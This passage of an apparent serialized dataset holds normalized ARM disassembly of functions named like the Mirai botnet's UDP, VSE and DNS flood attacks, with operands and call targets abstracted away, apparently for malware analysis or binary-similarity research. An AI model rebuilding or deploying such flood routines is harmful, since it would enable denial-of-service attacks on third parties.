2,LSL0]\nMOV~R5,R7\nADD~R6,R7,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R2,R3,R11\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nADD~R3,R3,R11\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R7,0]\nLDR~R2,[SP,0]\nCMN~R2,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R3,[SP,0]\nCMP~R3,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R1,[SP,0]\nCMP~R1,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R8\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,R8\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nBEQ~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R10,[R5,0]\nSTRB~R10,[R5,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R10,[R6,0]\nSTRB~R10,[R6,0]\nMOV~R0,R5\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nADD~R2,R2,R11\nLDR~R3,[R6]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nCMP~R9,R2\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p215
L1720L
tp216
a(S'attack_udp_plain'
p217
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nMOV~R11,R0\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nMOV~R8,R0\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R7,R0,LSR0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R10,R0,LSR0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R9,R0,0\nMOV~R3,0\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nCMP~R7,R6\nANDNE~R3,R7,0\nMOVNE~R3,R3,LSL0\nORRNE~R6,R3,R7,LSR0\nBNE~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R6,R0,LSR0\nLDR~R7,[SP,0]\nCMP~R7,0\nBLE~FOO\nLDR~R5,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nSTR~R2,[SP,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTR~R3,[SP]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R0,[R2,R11]\nLDR~R3,[SP,0]\nMOV~R2,0\nCMP~R3,R2\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nB~FOO\nLDR~R2,[SP,0]\nAND~R3,R2,0\nLDR~R2,[SP]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nMOV~R0,0\nMOV~R1,R0\nMOV~R2,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R2,[SP,0]\nSTR~R0,[R2,R8]\nCMN~R0,0\nBEQ~FOO\nMOV~R2,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R2,[SP,0]\nSTRB~R6,[SP,0]\nMOV~R3,R6,ASR0\nSTRB~R3,[SP,0]\nSTR~R2,[SP,0]\nADD~R1,SP,0\nADD~R2,R2,0\nBL~FOO\nSTR~R5,[SP,0]\nLDRB~R3,[R5,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R5,0]\nBL~FOO\nAND~R3,R4,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R4,LSR0\nAND~R2,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R2,LSL0\nORR~R3,R3,R4\nLDRB~R2,[R5,0]\nADD~R3,R3,R0,LSRR2\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~R2,R2,R3\nSTR~R2,[R5,0]\nLDR~R3,[SP,0]\nLDR~R0,[R3,R8]\nLDR~R1,[SP,0]\nMOV~R2,0\nBL~FOO\nLDR~R2,[SP,0]\nADD~R2,R2,0\nSTR~R2,[SP,0]\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nADD~R5,R5,0\nCMP~R7,R2\nBNE~FOO\nCMP~R7,0\nBLE~FOO\nMOV~R6,0\nMOV~R4,R6\nLDR~R5,[R4,R11]\nCMP~R9,0\nMOVNE~R0,R5\nMOVNE~R1,R10\nBLNE~FOO\nLDR~R0,[R4,R8]\nMOV~R1,R5\nMOV~R2,R10\nMOV~R3,0\nBL~FOO\nADD~R6,R6,0\nADD~R4,R4,0\nCMP~R6,R7\nBNE~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p218
L672L
tp219
a(S'attack_udp_generic'
p220
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R1,[SP,0]\nSTR~R1,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R11,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R9,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nSTR~R4,[SP,0]\nMOV~R2,R6,LSL0\nMOV~R2,R2,LSR0\nMOV~R3,0\nCMP~R2,R3\nMOVCC~R9,R2\nMOVCS~R9,R3\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R11,[SP,0]\nCMP~R11,0\nBLE~FOO\nMOV~R4,R3\nADD~R3,R9,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R5,R3,R2,LSL0\nMOV~R6,R5,ASR0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R3,[SP,0]\nSTR~R0,[R3,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R12,[SP,0]\nLDR~R1,[R12,R3,LSL0]\nADD~R0,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nSTRB~R10,[R1,0]\nSTRB~R5,[R1,0]\nSTRB~R6,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nSTRB~R8,[R1,0]\nCMP~R7,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R3,[SP,0]\nSTR~R3,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R12,[SP,0]\nADD~R3,R3,R12\nLDR~R3,[R3,0]\nSTR~R3,[R1,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nADD~R3,R9,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nCMP~R11,R4\nBGT~FOO\nMOV~R3,0\nCMP~R11,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R10,R3,0\nMOV~R8,0\nLDR~R3,[SP,0]\nLDR~R7,[R3,R2,LSL0]\nMOV~R6,R7\nADD~R5,R7,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R12,[SP,0]\nADD~R2,R3,R12\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R7,0]\nLDR~R2,[SP,0]\nCMN~R2,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R12,[SP,0]\nCMP~R12,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R1,[SP,0]\nCMP~R1,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nADDNE~R0,R5,0\nMOVNE~R1,R9\nBLNE~FOO\nSTRB~R8,[R6,0]\nSTRB~R8,[R6,0]\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R8,[R5,0]\nSTRB~R8,[R5,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nMOV~R0,R6\nMOV~R1,R5\nORR~R2,R3,R2,LSL0\nADD~R3,R9,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nLDR~R3,[SP,0]\nADD~R2,R2,R3\nLDR~R3,[R5]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nADD~R2,R9,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nCMP~R2,R11\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p221
L1256L
tp222
a(S'attack_udp_vse'
p223
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R11,R1\nMOV~R6,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R5,0\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,R5\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,R5\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nBL~FOO\nMOV~R5,R0\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R1,[SP,0]\nSTR~R1,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R9,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R4,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R9,[SP,0]\nCMP~R9,0\nBLE~FOO\nMOV~R4,R3\nLDR~R3,[SP,0]\nMOV~R6,R3,LSR0\nLDR~R1,[SP,0]\nMOV~R1,R1,LSR0\nSTR~R1,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R0,[R2,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R1,[R2,R3,LSL0]\nADD~R12,R1,0\nADD~R0,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nSTRB~R10,[R1,0]\nLDR~R2,[SP,0]\nADD~R2,R2,0\nMOV~R2,R2,LSL0\nMOV~R3,R2,LSR0\nAND~R3,R3,0\nORR~R3,R3,R2,LSR0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nAND~R3,R2,0\nORR~R3,R6,R3,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nSTRB~R8,[R1,0]\nCMP~R7,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R3,R3,R11\nLDR~R3,[R3,0]\nSTR~R3,[R1,0]\nLDR~R1,[SP,0]\nAND~R3,R1,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R12]\nMOV~R3,R3,ASR0\nSTRB~R3,[R12,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R12,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R12,0]\nLDR~R2,[SP,0]\nADD~R2,R2,0\nMOV~R2,R2,LSL0\nMOV~R3,R2,LSR0\nAND~R3,R3,0\nORR~R3,R3,R2,LSR0\nSTRB~R3,[R12,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R12,0]\nMOV~R3,0\nSTR~R3,[R0]\nMOV~R1,R5\nLDR~R2,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nCMP~R4,R9\nBLT~FOO\nMOV~R3,0\nCMP~R9,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R10,R3,0\nMOV~R8,0\nLDR~R3,[SP,0]\nLDR~R7,[R3,R2,LSL0]\nMOV~R6,R7\nADD~R5,R7,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R2,R3,R11\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nADD~R3,R3,R11\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R7,0]\nLDR~R1,[SP,0]\nCMP~R1,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R3,[SP,0]\nCMP~R3,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R8,[R6,0]\nSTRB~R8,[R6,0]\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R8,[R5,0]\nSTRB~R8,[R5,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nMOV~R0,R6\nMOV~R1,R5\nORR~R2,R3,R2,LSL0\nLDR~R3,[SP,0]\nADD~R3,R3,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nADD~R2,R2,R11\nLDR~R3,[R5]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nLDR~R2,[SP,0]\nADD~R2,R2,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nCMP~R2,R9\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p224
L1160L
tp225
a(S'attack_udp_dns'
p226
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R9,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R8,R0\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nCMP~R4,0\nBLT~FOO\nADD~R7,SP,0\nSUB~R7,R7,0\nMOV~R0,R4\nMOV~R1,R7\nMOV~R2,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R7\nMOV~R1,R6\nBL~FOO\nMOV~R5,R0\nMOV~R0,0\nBL~FOO\nCMN~R5,0\nBEQ~FOO\nCMP~R6,R5\nBLE~FOO\nADD~R0,R7,R5\nMOV~R4,R5\nMOV~R12,0\nADD~R7,SP,0\nADD~R7,R7,0\nADD~R1,SP,0\nSUB~R1,R1,0\nLDRB~R2,[R0]\nCMP~R12,0\nBNE~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nADD~R12,R12,0\nSUB~R3,R2,0\nCMP~R2,0\nCMPNE~R3,0\nBHI~FOO\nSUB~R3,R6,0\nCMP~R4,R3\nBNE~FOO\nRSB~R4,R5,R4\nMOV~R0,R7\nADD~R1,R1,R5\nMOV~R2,R4\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R2,R1,R4\nMOV~R3,0\nSTRB~R3,[R2,-0]\nMOV~R0,R7\nBL~FOO\nSTR~R0,[SP,0]\nB~FOO\nADD~R4,R4,0\nADD~R0,R0,0\nCMP~R6,R4\nBNE~FOO\nBL~FOO\nAND~R0,R0,0\nCMP~R0,0\nLDRLS~PC,[PC,R0,LSL0]\nB~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nB~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nB~FOO\nMOV~R3,0\nORR~R3,R3,R3,LSL0\nSTR~R3,[SP,0]\nB~FOO\nLDR~R2,<STR>\nSTR~R2,[SP,0]\nCMP~R8,0\nBEQ~FOO\nMOV~R0,R8\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R3,[SP,0]\nSTR~R3,[SP,0]\nLDR~R4,[SP,0]\nMOV~R3,R4,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R4,[SP,0]\nMOV~R3,R4,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nAND~R11,R11,0\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nSTR~R1,[SP,0]\nBLE~FOO\nMOV~R4,R3\nLDR~R2,[SP,0]\nADD~R3,R11,R2\nMOV~R3,R3,LSL0\nADD~R6,R3,0\nMOV~R7,R6,LSR0\nADD~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R1,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R2,[SP,0]\nLDR~R1,[R2,R3,LSL0]\nADD~LR,R1,0\nADD~R12,R1,0\nADD~R0,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nMOV~R3,R6,LSR0\nAND~R3,R3,0\nORR~R3,R7,R3,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R4,[SP,0]\nMOV~R3,R4,LSR0\nAND~R2,R4,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nSTRB~R9,[R1,0]\nCMP~R10,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R1,0]\nLDR~R2,[SP,0]\nSTR~R2,[R1,0]\nLDR~R4,[SP,0]\nMOV~R3,R4,LSR0\nAND~R2,R4,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[LR]\